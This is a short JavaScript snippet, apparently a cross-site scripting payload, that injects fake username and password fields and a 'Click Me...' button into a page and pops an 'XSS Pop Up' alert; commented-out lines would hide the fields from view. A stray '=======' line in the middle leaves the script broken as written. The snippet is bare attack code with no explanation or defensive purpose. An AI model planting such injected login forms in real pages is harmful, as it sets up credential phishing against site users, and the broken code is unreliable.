let body = document.getElementsByTagName("body")[0]
var u = document.createElement("input");
u.type = "text";
u.placeholder="Input User Name";
//u.style.position = "fixed";
//u.style.opacity = "0";

var p = document.createElement("input");
p.type = "password";
p.placeholder="Input Password";
//p.style.position = "fixed";
//p.style.opacity = "0";

var b = document.createElement("button");
b.type="submit";
b.textContent = 'Click Me...';

alert("XSS Pop Up");
=======

body.append(u)
body.append(p)
body.append(b)
